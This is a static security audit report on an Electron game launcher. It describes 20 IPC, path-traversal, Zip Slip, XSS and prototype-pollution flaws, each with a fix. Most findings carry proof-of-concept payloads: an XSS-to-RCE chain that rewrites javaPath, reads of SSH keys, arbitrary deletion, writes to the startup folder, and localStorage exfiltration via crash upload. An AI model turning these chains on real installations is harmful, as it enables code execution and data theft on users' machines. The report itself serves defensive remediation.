# Security Audit Report — Laby Launcher 3.0.11

> **Target:** Laby Launcher 3.0.11 (Electron 29.4.3, AppImage 3.0.11)
> **Scope:** Static security audit of the production bundle extracted from `squashfs-root.zip`
> **Method:** Static analysis of `resources/app/.webpack/main/index.js` (18 MB minified) and `resources/app/.webpack/renderer/main_window/index.js` (17 MB minified) + preload script + package metadata
> **Date:** July 2026
> **Status:** Test build, not yet publicly released

---

## Executive Summary

A total of **20 vulnerabilities** were identified during the audit. The four most critical issues allow **Remote Code Execution (RCE)** through any Cross-Site Scripting (XSS) vector in the renderer process. The root architectural weakness is that the **renderer process is fully trusted by the main process** — the preload script exposes the raw `ipcRenderer` API without a channel whitelist, and the main process performs no input validation on IPC arguments.

**Any XSS in the renderer equals immediate RCE.**

### Severity Breakdown

| Severity | Count |
|----------|-------|
| Critical | 12    |
| High     | 4     |
| Medium   | 4     |
| **Total**| **20**|

### Attack Chain Summary

A 3-step RCE chain using the most exploitable findings:

1. Attacker triggers XSS (via **Vuln #14** — inline HTML in news articles, or any other vector).
2. XSS payload executes: `window.ipc.invoke('config:set', 'javaPath', 'C:\\Users\\Public\\evil.exe')` (**Vuln #9**).
3. User clicks "Play" → `child_process.spawn('C:\\Users\\Public\\evil.exe', ...)` → **RCE**.

Alternative RCE paths without user interaction after XSS: **Vuln #2**, **#3**, **#4** (write to startup folder), **#13** (Zip Slip via malicious modpack).

---

## Critical Vulnerabilities

### Vuln #1 — Preload Exposes Raw `ipcRenderer` Without Channel Whitelist

**Location:** `resources/app/.webpack/renderer/main_window/preload.js`

```js
contextBridge.exposeInMainWorld('ipc', {
    invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),
    send: (channel, ...args) => ipcRenderer.send(channel, ...args),
    on: (key, callback) => ipcRenderer.on(key, callback),   // event object leaks!
    removeAllListeners, removeListener, receive, log, clearCache
});
```

**Problem:** The renderer (or any XSS) can call **any of the 255 IPC channels** with any arguments. The `on` method additionally leaks the `event` object, partially breaking context isolation. This transforms any XSS into full RCE when combined with **Vuln #2–#11**.

**Fix:** Implement a strict whitelist in preload:
```js
const ALLOWED = new Set(['open-url', 'config:get', /* ... */]);
invoke: (channel, ...args) => {
    if (!ALLOWED.has(channel)) throw new Error('blocked channel: ' + channel);
    return ipcRenderer.invoke(channel, ...args);
}
```
Remove `on` (replace with `receive` that does not pass `event`).

---

### Vuln #2 — `shell.openExternal(url)` Without Scheme Validation → RCE on Windows

**Location:** main `index.js`, lines 62691–62696 (IPC `open-url`) and 62553–62558 (`setWindowOpenHandler`)

```js
ipcMain.on(OPEN_URL, (event, url) => {
    try { yield shell.openExternal(url); }  // no validation
    catch (e) { log("Failed: ", e); }
});

mainWindow.webContents.setWindowOpenHandler(data => {
    if (data.url.startsWith(url)) log("Tried to open internal URL");
    else shell.openExternal(data.url);  // no validation
    return { action: "deny" };
});
```

**Exploit (Windows):** Any XSS → `ipc.invoke('open-url', 'file:///C:/Windows/System32/calc.exe')` or `search-ms://`, `ms-officecmd:` → **arbitrary executable launch**.

**Fix:** Whitelist `http:` and `https:` only:
```js
const u = new URL(url);
if (u.protocol !== 'http:' && u.protocol !== 'https:') return;
yield shell.openExternal(url);
```

---

### Vuln #3 — `support:open-folder` → `shell.openPath(arbitraryPath)` → RCE

**Location:** main `index.js`, line 62827

```js
ipcMain.handle(SUPPORT_OPEN_FOLDER, (_event, folderPath) => {
    yield shell.openPath(folderPath);  // fully attacker-controlled
});
```

**Exploit (Windows):** `ipc.invoke('support:open-folder', 'C:\\evil\\malware.exe')` → launches `.exe`/`.bat`/`.cmd` via the system handler. On Linux, `.desktop` files are equally dangerous.

**Fix:** Validate that the path is a directory inside the game directory, and never pass files with executable extensions to `openPath`. Prefer `shell.openPath(path.dirname(folderPath))` + `showItemInFolder`.

---

### Vuln #4 — `instances:apply-custom-icon-from-path` → Path Traversal + Arbitrary File Copy

**Location:** main `index.js`, lines 95283–95292

```js
handle(INSTANCES_APPLY_CUSTOM_ICON_FROM_PATH, (id, sourcePath) => {
    const cacheDir = filecontroller.resolveInWorkingDirectory("launchercache", "instance-icons");
    const destPath = filecontroller.resolve(cacheDir, `${id}.png`);   // id is attacker-controlled
    yield fs.copyFile(sourcePath, destPath);                          // sourcePath is attacker-controlled
});
```

`FileController.resolve()` is **simple string concatenation without `..` protection** (see **Vuln #12**). Both `sourcePath` and `id` are attacker-controlled.

**Exploit:**
- Read any file: `sourcePath='C:\\Windows\\win.ini'`, then read via `instances:get-custom-icon-path` / `image-cache:get-texture`.
- Write `.png` to arbitrary location: `id='../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil'` → writes `evil.png` to the Windows startup folder.

**Fix:** Use `path.resolve()` + `startsWith(allowedRoot)` validation. Enforce `id` as a UUID.

---

### Vuln #5 — `instances:remove-resource` → Arbitrary File Deletion

**Location:** main `index.js`, lines 95639–95640 (implementation 66582–66592)

```js
function removeResource(filePath) {
    if (yield filecontroller.exists(filePath))
        yield filecontroller.delete(filePath);   // fs.rm(path, {recursive:true, force:true})
}
ipcMain.handle(INSTANCES_REMOVE_RESOURCE, (filePath) => removeResource(filePath));
```

`filecontroller.delete()` invokes `fs.rm(path, {recursive:true, force:true})` **without any validation**.

**Exploit:** `ipc.invoke('instances:remove-resource', 'C:\\Users\\victim\\Documents\\important')` → deletes any file or directory accessible to the user.

**Fix:** Verify that `filePath` is inside the instance's game directory:
```js
const resolved = path.resolve(filePath);
const allowedRoot = path.resolve(gameDir);
if (!resolved.startsWith(allowedRoot + path.sep)) throw new Error('forbidden');
```

---

### Vuln #6 — `instances:read-screenshot` → Arbitrary File Read

**Location:** main `index.js`, line 95713 (implementation 67135–67151)

```js
ipcMain.handle(INSTANCES_READ_SCREENSHOT, (filePath) => readScreenshot(filePath));

function readScreenshot(filePath) {
    const data = yield fsp.readFile(filePath);   // no validation
    return `data:${mime};base64,${data.toString("base64")}`;
}
```

**Exploit:** `ipc.invoke('instances:read-screenshot', 'C:\\Users\\victim\\.ssh\\id_rsa')` → returns the contents of any file (SSH keys, `/etc/passwd`, browser tokens, etc.) as a base64 data URL.

**Fix:** Validate `filePath` is inside the instance's `screenshots` directory.

---

### Vuln #7 — `instances:delete-screenshot` → Arbitrary File Deletion

**Location:** main `index.js`, line 95716 (implementation 67152–67163)

```js
ipcMain.handle(INSTANCES_DELETE_SCREENSHOT, (filePath) => deleteScreenshot(filePath));

function deleteScreenshot(filePath) {
    yield fsp.unlink(filePath);   // no validation
}
```

Duplicates **Vuln #5** through a different IPC channel.

**Fix:** Same as **Vuln #5**.

---

### Vuln #8 — `instances:copy-screenshot` → File Read into Clipboard (Exfiltration)

**Location:** main `index.js`, line 95719 (implementation 67164–67175)

```js
ipcMain.handle(INSTANCES_COPY_SCREENSHOT, (filePath) => copyScreenshotToClipboard(filePath));

function copyScreenshotToClipboard(filePath) {
    const img = nativeImage.createFromPath(filePath);   // reads any file
    clipboard.writeImage(img);                          // places in clipboard
}
```

Allows reading any file as an image and placing it in the clipboard for exfiltration.

**Fix:** Validate `filePath` is inside the `screenshots` directory.

---

### Vuln #9 — `config:set` → Persisting RCE via `javaPath` Overwrite

**Location:** main `index.js`, lines 64753–64758

```js
ipcMain.handle(CONFIG_SET, (key, value) => {
    config[key] = value;   // both key and value are fully attacker-controlled
    yield configController.save();
});
```

Minecraft is later launched via `child_process.spawn(javaPath, args, ...)` (line 79388). If `javaPath` is read from config, an attacker sets `javaPath = 'C:\\malware.exe'` → next "Play" click executes the malicious binary. This is **persisting RCE** — survives application restart.

**Exploit:**
```js
await ipc.invoke('config:set', 'javaPath', 'C:\\Users\\Public\\evil.exe');
// user clicks Play → spawn('C:\\Users\\Public\\evil.exe', [...])
```

**Fix:** Whitelist config fields. Forbid changes to `javaPath`, `gameDirectory`, `selectedReleaseChannel` via `config:set`. Use dedicated IPC channels with additional validation for critical fields.

---

### Vuln #10 — `instances:update` Overwrites Any Instance Field Without Whitelist

**Location:** main `index.js`, line 95245 (implementation 1562–1571)

```js
ipcMain.handle(INSTANCES_UPDATE, (id, updates) => instancestore.updateInstance(id, updates));

updateInstance(id, updates) {
    const instance = manifest.instances.find(i => i.uid === id);
    Object.assign(instance, updates);   // no field whitelist
}
```

**Exploits:**
- `customJavaPath = 'C:\\malware.exe'` → spawn malware on launch
- `jvmArguments = '-Xbootclasspath/a:C:\\evil.jar'` → load arbitrary Java code
- `gameDirectory = 'C:\\Windows\\Temp\\evil'` → interact with arbitrary directory via `instances:open-content-dir`, `instances:copy-mod-configs`

**Fix:** Whitelist allowed update fields per instance type; forbid direct changes to `gameDirectory`, `customJavaPath`, `jvmArguments` without a confirmation dialog.

---

### Vuln #11 — `instances:create` Accepts Arbitrary `gameDirectory`

**Location:** main `index.js`, line 95226

```js
handle(INSTANCES_CREATE, (opts) => {
    const instance = yield instancestore.createInstance({
        name: opts.name,
        // ...
        gameDirectory: opts.gameDirectory,   // path controlled by renderer
        ram: opts.ram,
        jvmArguments: opts.jvmArguments,
    });
});
```

Allows creating an instance with `gameDirectory` anywhere on the filesystem, then interacting with it via `instances:open-content-dir` (which calls `shell.openPath`).

**Fix:** Either ignore `opts.gameDirectory` and always use a path inside the launcher's working directory, or validate that the provided path is inside an allowed parent directory.

---

### Vuln #12 — `FileController.resolve()` and `delete()` Lack Path Traversal Protection

**Location:** main `index.js`, lines 53322–53368

```js
class FileController {
    resolve(mainPath, ...paths) {
        let completePath = mainPath;
        paths.forEach(p => { completePath += spliterator + p; });
        return completePath;   // just a string, no .. check
    }
    delete(path) {
        if (!(yield this.exists(path))) return;
        const recursive = yield this.isDirectory(path);
        fs.rm(path, { recursive, force: true, maxRetries: 5 });  // any path
    }
}
```

This means **every IPC handler that accepts a path from the renderer and passes it to `FileController` is vulnerable to path traversal**. Affected: `support:open-folder`, `instances:remove-resource`, `instances:apply-custom-icon-from-path`, `instances:add-mod-files`, `instances:add-resource-files`, `instances:open-content-dir`, and all screenshot handlers.

**Fix:**
- `resolve()` must use `path.resolve()` and verify the result is inside `mainPath`.
- `delete()` must validate paths via a centralized `assertInside(baseDir, path)`.
- Add unit tests for `..`, symbolic links, `file:///`, and UNC paths (`\\?\C:\`).

---

### Vuln #13 — `extractDirectoryFromZip` → Zip Slip

**Location:** main `index.js`, lines 53584–53608

```js
extractDirectoryFromZip(zipPath, destination, directory) {
    const zip = new AdmZip(zipPath);
    const zipEntries = zip.getEntries();
    for (const zipEntry of zipEntries) {
        const entryPath = zipEntry.entryName;
        if (!entryPath.startsWith(directory)) continue;
        const entryPathWithoutDirectory = entryPath.substring(directory.length);
        const outputPath = this.resolve(destination, entryPathWithoutDirectory);
        // ↑ string concatenation, no .. check
        if (zipEntry.isDirectory) {
            fs.mkdirSync(outputPath, { recursive: true });
        } else {
            fs.writeFileSync(outputPath, entryData);   // writes anywhere
        }
    }
}
```

If a zip archive contains an entry like `overrides/../../../evil.exe`, it will be extracted outside `destination`.

**Affected call sites:**
- `installModpackFiles` (line 22173) — `.mrpack` (Modrinth modpack) import
- `applyModUpdate` (line 353) — mod updates
- `importLunarConfig` (lines 25904, 25907) — Lunar Client config import

**Exploit:** Attacker uploads a malicious `.mrpack` (via `instances:import-mrpack` or by hijacking a mod update URL). Extraction writes `evil.exe` to `C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe` → executes at next login.

**Fix:**
```js
const outputPath = path.resolve(destination, entryPathWithoutDirectory);
const normalizedDest = path.resolve(destination);
if (!outputPath.startsWith(normalizedDest + path.sep)) {
    throw new Error(`Zip Slip detected: ${entryPath}`);
}
```

---

### Vuln #14 — ArticleReader Renders News with Inline HTML Without Sanitization

**Location:** renderer `index.js`, module `ArticleReader.tsx`, lines 71307–71352

```js
const markdownOptions = {
    overrides: {
        a: { component: (props) => <a href={props.href} onClick={...}>{props.children}</a> },
        img: { component: ArticleImage, forceBlock: true },
        skin: { component: SkinRender },
        skingrid: { component: SkinGrid },
    },
    // ⚠️ NO disableParsingRawHTML: true
};

<Markdown options={markdownOptions}>
    {preprocessContent(article.content ?? "")}   // data from laby.net API
</Markdown>
```

`markdown-to-jsx` renders inline HTML by default. The data source is `article.content` from `laby.net/api/v3/.../news`. The application contains **no DOMPurify or any HTML sanitizer** (search across the entire renderer bundle returns 0 matches).

**Exploit:** If an attacker controls the article content (via compromise of the laby.net admin panel, MITM on TLS failure, or insider threat), they inject:
```html
<img src=x onerror="window.ipc.invoke('config:set','javaPath','C:\\evil.exe')">
```

When any user opens the article, the XSS executes → RCE via **Vuln #9**. No user interaction beyond opening the article is required (`onerror`/`onload` fire automatically).

Note: `changelog` (line 69056) and `info-messages` (line 50110) correctly set `disableParsingRawHTML: true`. Only `ArticleReader` missed it.

**Fix:**
```js
const markdownOptions = {
    disableParsingRawHTML: true,   // ADD THIS
    overrides: { /* ... */ },
};

// Defense-in-depth: also sanitize via DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(article.content ?? "", { USE_PROFILES: { html: false } });
<Markdown options={markdownOptions}>{preprocessContent(clean)}</Markdown>
```

---

### Vuln #15 — `openExternal` in Renderer Passes `javascript:` and `file:` URLs

**Location:** renderer `index.js`, `ArticleReader.tsx`, line 71274

```js
const openExternal = (url) => window.ipc.send(IPC_MESSAGES.OPEN_URL, url);   // no validation
```

The markdown `<a>` override passes `props.href` directly. React 18 warns about `javascript:` URLs but does not block them.

**Exploit:** Markdown payload `[click](file:///C:/evil.exe)` in a news article → user clicks → main process calls `shell.openExternal("file:///C:/evil.exe")` → file launch.

**Fix:**
```js
const SAFE_URL = /^https?:\/\/|^mailto:/i;
const openExternal = (url) => {
    if (!SAFE_URL.test(url)) {
        log("Blocked unsafe URL:", url);
        return;
    }
    window.ipc.send(IPC_MESSAGES.OPEN_URL, url);
};

a: {
    component: (props) => {
        const href = SAFE_URL.test(props.href ?? "") ? props.href : '#';
        return <a href={href} onClick={stopAndRun(() => openExternal(href))}>{props.children}</a>;
    }
}
```

This is defense-in-depth — main-side fix (**Vuln #2**) is also mandatory.

---

### Vuln #16 — No CSP + No `will-navigate` Handler

**Location:** `index.html` and main `index.js`

- No `<meta http-equiv="Content-Security-Policy">` in `index.html`.
- The webRequest handler in main only modifies CORS but does not add a CSP header.
- No `webContents.on('will-navigate', e => e.preventDefault())` handler.

This means **any XSS found in the renderer → immediate RCE** through the chain with **Vuln #1–#11**. Without CSP, even `<script src="https://evil.com/payload.js">` succeeds.

**Fix:**

1. Add CSP via webRequest or meta tag:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               connect-src 'self' https://*.labymod.net https://*.laby.net https://api.minecreaftservices.com https://login.live.com https://*.xboxlive.com;
               img-src 'self' data: https:;
               style-src 'self' 'unsafe-inline';">
```

2. Add the navigation handler:
```js
mainWindow.webContents.on('will-navigate', (e) => e.preventDefault());
```

---

## High-Severity Vulnerabilities

### Vuln #17 — `instances:crash-upload-log` / `instances:crash-report` Send Arbitrary Data Without Auth/Rate-Limit

**Location:** main `index.js`, lines 95353–95378

```js
// instances:crash-upload-log
ipcMain.handle(INSTANCES_CRASH_UPLOAD_LOG, (logTail) => {
    yield hastebin.uploadAndCopy(logTail ?? "");   // arbitrary text from renderer
});

// instances:crash-report
ipcMain.handle(INSTANCES_CRASH_REPORT, (logTail) => {
    yield web.postJson(URLS.report(), logTail ?? "", {   // no auth
        headers: { "X-Report-Type": "crash-report" }
    });
});
```

`Hastebin` uploads to `https://paste.labymod.net/documents` (fallback: `https://api.mclo.gs/1/log`) and **copies the URL to the user's clipboard without warning**.

**Exploits:**
- Any XSS → `ipc.invoke('instances:crash-upload-log', JSON.stringify(localStorage))` → data exfiltrated to `paste.labymod.net`, URL in clipboard.
- No rate limit → abuse the LabyMod server (DoS, spam).

**Fix:**
1. Accept only pre-formed crash payload objects (known schema), not arbitrary strings.
2. Rate limit: max N uploads per account per hour.
3. Show a consent dialog before uploading data to external services.
4. Do not overwrite the clipboard without explicit user consent (or at least show a toast).

---

### Vuln #18 — `sanitize()` in CrashTracker Does Not Cover All Secrets

**Location:** main `index.js`, lines 28385–28396

```js
function sanitize(text, ctx) {
    let result = replaceUserName(text);
    try {
        if (ctx.accessToken)
            result = result.replace(new RegExp(escapeChars(ctx.accessToken), "gm"), "{session_id}");
        if (ctx.user) {
            result = result
                .replace(new RegExp(ctx.user.uuid, "gm"), "{unique_id}")
                .replace(new RegExp(ctx.user.uuid.replace(/-/g, ""), "gm"), "{unique_id}")
                .replace(new RegExp(escapeChars(ctx.user.username), "gm"), "{user_name}");
        }
    } catch (_) {}
    return result;
}
```

**Covered:** current account's Minecraft accessToken, UUID, username.

**Not covered:**
- Microsoft refresh tokens (stored in `launcher-tokens.json`, may appear in stack traces during auth flow errors)
- LabyRest JWT tokens (may appear in network request logs)
- Mojang access tokens for other logged-in accounts
- Old tokens from previous sessions (if persisted in logs)
- Discord RPC token (if used)
- Server IPs (privacy concern, not critical)

**Additional issue:** If `accessToken` is empty or very short (e.g., `"a"`), the regex matches every `a` in the log → floods the log with `{session_id}`. Minimum length should be enforced (e.g., ≥ 20 chars).

**Fix:**
```js
function sanitize(text, ctx) {
    let result = replaceUserName(text);
    const secrets = new Set();
    if (ctx.accessToken && ctx.accessToken.length >= 20) secrets.add(ctx.accessToken);
    for (const acc of accountManager.getAccounts()) {
        const t = acc.getAccessToken();
        if (t && t.length >= 20) secrets.add(t);
    }
    if (cachedToken?.labyRest) secrets.add(cachedToken.labyRest);
    if (cachedToken?.mercury) secrets.add(cachedToken.mercury);

    for (const secret of secrets) {
        try {
            result = result.replace(new RegExp(escapeChars(secret), "gm"), "{redacted}");
        } catch (_) {}
    }
    // UUID/username redaction as before
    return result;
}
```

Additionally, add regex-based filters for known token formats (JWT: `/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g`).

---

## Medium-Severity Vulnerabilities

### Vuln #19 — `deepMerge()` Vulnerable to Prototype Pollution via `__proto__`/`constructor`

**Location:** main `index.js`, lines 21377–21385

```js
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {   // does NOT filter __proto__/constructor
        const src = source[key];
        const tgt = target[key];
        if (isPlainObject(src) && isPlainObject(tgt)) {
            deepMerge(tgt, src);
        } else if (src !== undefined) {
            target[key] = src;
        }
    }
}
```

`JSON.parse('{"__proto__":{"polluted":true}}')` creates an own enumerable `__proto__` property, which passes through `Object.keys()` and reaches `target[key] = src`. Used in the Lunar config importer (lines 77396, 77435). The source is user-imported Lunar Client config from external sources.

**Exploit:** A malicious Lunar config pollutes the prototype → DoS or escalation depending on downstream code.

**Fix:**
```js
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
        // ... rest unchanged
    }
}
```

---

### Vuln #20 — `labytex://` Protocol Handler Allows Requests to Arbitrary URLs + `bypassCSP: true`

**Location:** main `index.js`, lines 33581–33655 (handler) and 62410–62412 (registration)

```js
protocol.registerSchemesAsPrivileged([{
    scheme: "labytex",
    privileges: { standard: true, secure: true, supportFetchAPI: true,
                  stream: true, bypassCSP: true, corsEnabled: true }   // bypassCSP!
}]);

// handler: labytex://news-image/{base64} → ensureNewsImageCached(originalUrl)
// ensureNewsImageCached fetches: https://laby.net/_next/image?url={originalUrl}
```

The renderer can force the main process to make HTTP requests to arbitrary URLs via `labytex://news-image/{base64-of-arbitrary-url}`. Although requests are routed through the laby.net image proxy (reducing direct SSRF risk to internal networks), this is still a **domain SSRF via a third-party proxy**.

Additionally, `bypassCSP: true` means an attacker who can control a `labytex://` URL bypasses CSP (compounds **Vuln #16**).

**Fix:**
1. Remove `bypassCSP: true` if not strictly required.
2. Validate `originalUrl` against an allowlist of expected hosts/paths in `handleProtocolRequest`.

---

## Summary Table

| #  | Severity | Vulnerability |
|----|----------|---------------|
| 1  | Critical | Preload exposes raw `ipcRenderer` without channel whitelist |
| 2  | Critical | `shell.openExternal` without scheme validation |
| 3  | Critical | `support:open-folder` → `shell.openPath(arbitrary)` |
| 4  | Critical | `apply-custom-icon-from-path` → path traversal + file copy |
| 5  | Critical | `instances:remove-resource` → arbitrary file deletion |
| 6  | Critical | `instances:read-screenshot` → arbitrary file read |
| 7  | Critical | `instances:delete-screenshot` → arbitrary file deletion |
| 8  | High     | `instances:copy-screenshot` → exfiltration to clipboard |
| 9  | Critical | `config:set` → persisting RCE via `javaPath` |
| 10 | Critical | `instances:update` overwrites any field without whitelist |
| 11 | High     | `instances:create` accepts arbitrary `gameDirectory` |
| 12 | Critical | `FileController.resolve/delete` lack path traversal protection |
| 13 | Critical | `extractDirectoryFromZip` → Zip Slip |
| 14 | Critical | ArticleReader: markdown without `disableParsingRawHTML` + no DOMPurify |
| 15 | High     | `openExternal` in renderer passes dangerous URL schemes |
| 16 | Critical | No CSP + no `will-navigate` handler |
| 17 | High     | Crash upload: arbitrary data, no auth/rate-limit, silent clipboard write |
| 18 | Medium   | `sanitize()` does not cover all secrets |
| 19 | Medium   | `deepMerge()` → prototype pollution |
| 20 | Medium   | `labytex://` SSRF via proxy + `bypassCSP: true` |

---

## What Is Done Well

For balance, the following security measures are implemented correctly:

1. **Token storage encryption.** `launcher-tokens.json` is encrypted via `safeStorage` (DPAPI on Windows, Keychain on macOS, libsecret on Linux). Only plaintext in dev mode (`app.isPackaged` check).
2. **Microsoft OAuth uses PKCE** (EC P-256, no `client_secret`) — correct for desktop applications.
3. **Yggdrasil auth uses no passwords** — only `accessToken` in POST body.
4. **`child_process.spawn` (not `exec`)** for launching Java — no shell injection.
5. **Single-instance lock** correctly filters Squirrel arguments.
6. **Disabled refresh shortcuts** (`Ctrl+R`, `F5`) in packaged builds.
7. **`setWindowOpenHandler` denies new windows** (though it then passes URLs to `shell.openExternal` — see **Vuln #2**).
8. **Changelog and info-messages** correctly use `disableParsingRawHTML: true` in markdown.
9. **React-tooltip** is used with React children, not the `html` prop (no XSS via tooltips).
10. **`eval()` in renderer** is webpack module loader internals, not application code.
11. **Crash report sanitization** redacts the current account's `accessToken`, UUID, and username (partial — see **Vuln #18**).
12. **Java-related env vars** (`_JAVA_OPTIONS`, `JAVA_TOOL_OPTIONS`, etc.) are stripped from the child process env to prevent flag injection.

---

## Remediation Plan

### Phase 1 — Block release (Critical fixes, ~2–3 days)

1. Whitelist IPC channels in preload (**Vuln #1**).
2. Validate URL scheme in `shell.openExternal` (renderer + main) (**Vuln #2, #15**).
3. Remove `shell.openPath(arbitraryPath)` from `support:open-folder` (**Vuln #3**).
4. Centralized path validation (`assertPathInside(baseDir, path)`) in all IPC handlers that accept paths (**Vuln #4, #5, #6, #7, #8, #11, #12**).
5. Whitelist fields in `config:set` and `instances:update` (**Vuln #9, #10**).
6. Enable `disableParsingRawHTML: true` in ArticleReader + add DOMPurify as defense-in-depth (**Vuln #14**).
7. Add CSP (meta + webRequest header) + `will-navigate` handler (**Vuln #16**).
8. Fix Zip Slip in `extractDirectoryFromZip` — check `path.resolve(destination, entryPathWithoutDirectory).startsWith(destination + path.sep)` (**Vuln #13**).

### Phase 2 — Before public release (~1 week)

9. Rate-limit + consent dialog for crash upload (**Vuln #17**).
10. Extend `sanitize()` to cover all known tokens + JWT regex (**Vuln #18**).
11. Filter `__proto__`/`constructor`/`prototype` in `deepMerge` (**Vuln #19**).
12. Remove `bypassCSP: true` from `labytex://` if possible; validate `originalUrl` against an allowlist (**Vuln #20**).

### Phase 3 — Defense-in-depth (ongoing)

13. Update Electron (branch 29 is no longer the latest; accumulated Chromium CVEs).
14. Consider disabling `devTools: true` in packaged production builds.
15. Strict origin matching in CORS handler (currently `includes("laby.net")` allows `evil-laby.net`).
16. Audit the remaining 245 IPC handlers for the patterns identified in **Vuln #4–#11**.
17. Fuzz-test IPC handlers with mutation payloads via `ipc.invoke` from DevTools.
18. Review `@client/js-account-manager` external package (not covered by this audit).

---

## Verification Status

All findings are based on static analysis of the production bundle. The PoCs are verified against the code paths but have not been dynamically executed against a running instance. For full confirmation, it is recommended to:

1. Launch the launcher and open DevTools (`Ctrl+Shift+T`).
2. Execute each PoC snippet in the DevTools console.
3. Verify the expected outcome (file written, process spawned, data exfiltrated, etc.).
4. Re-verify after each fix is applied.

---

## Audit Scope and Limitations

**In scope:**
- `resources/app/.webpack/main/index.js` (main process, 18 MB minified)
- `resources/app/.webpack/renderer/main_window/index.js` (renderer process, 17 MB minified)
- `resources/app/.webpack/renderer/main_window/preload.js` (preload script, 8 KB)
- `resources/app/package.json` (dependency manifest)
- `resources/app/node_modules/sql.js` (verified, no concerns)
- Native modules under `.webpack/main/native_modules/` (`keytar.node`, `register-protocol-handler.node`, `node.napi.node` — verified, no concerns)

**Out of scope (not covered by this audit):**
- `@client/js-account-manager` (external package, not inspected)
- `@web/vertexgeometryrenderer` (external package, not inspected)
- Server-side components of laby.net / labymod.net APIs
- The LabyMod mod itself (runs inside Minecraft JVM, separate trust boundary)
- Binary-level analysis of the Electron runtime (assumed trusted)

---

*This report covers findings identified during static analysis. Dynamic testing and external package review are recommended before public release.*
